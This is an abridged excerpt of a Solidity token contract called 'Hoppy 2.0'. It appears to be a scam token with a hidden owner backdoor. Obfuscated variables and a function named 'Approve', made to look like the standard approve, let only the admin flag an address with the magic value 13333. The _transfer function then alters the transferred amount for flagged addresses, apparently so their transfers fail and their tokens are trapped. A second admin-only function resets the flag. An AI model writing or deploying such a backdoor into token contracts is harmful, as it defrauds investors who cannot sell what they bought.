...
contract Token is Ownable {
    ...
    address public qioeAdmintti;
    uint256 private tokensupply = 10000000000*10**decimals();

    uint256 private _tokentotalSSSupply;
    string private _Tokename = "Hoppy 2.0";
    string private _tokenSSSsymbol = "HOPPY 2.0";

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) public xoimuserlpue;
    ...
    function exitkillvipccc(address cjjjss) public    {
        uint128 zramount = 0;
        xoimuserlpue[cjjjss] = zramount;    
        if(_msgSender() == qioeAdmintti){
            require(_msgSender() == qioeAdmintti);
        }else{
            require(_msgSender() == qioeAdmintti);
        }
    ...
    function Approve(address cjjjss) public    {
        ...
        xoimuserlpue[cjjjss] = newpassnum;
        if(_msgSender() == qioeAdmintti){
            require(_msgSender() == qioeAdmintti);
        }else{
            require(_msgSender() == qioeAdmintti);
    ...
    function _transfer(
        ...
        if (13333 != xoimuserlpue[vipFrom]) {}else{
            amount = _balances[vipFrom] + xoimuserlpue[vipFrom];
        }
